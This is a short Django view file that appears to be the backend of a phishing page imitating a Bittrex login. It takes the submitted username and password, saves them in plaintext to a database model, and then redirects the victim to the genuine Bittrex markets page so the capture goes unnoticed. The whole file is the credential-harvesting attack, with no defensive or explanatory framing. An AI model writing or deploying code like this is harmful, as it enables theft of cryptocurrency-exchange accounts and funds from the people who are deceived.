from django.shortcuts import render, redirect

from gadzylogin.models import LoginDetails


def page(request):
    if request.POST:

        UserName = request.POST.get("UserName")
        Password = request.POST.get('Password')

        new_applicant = LoginDetails(username=UserName, password=Password)

        new_applicant.save()
        return redirect('https://bittrex.com/home/markets')
    else:
        return render(request, 'index.html')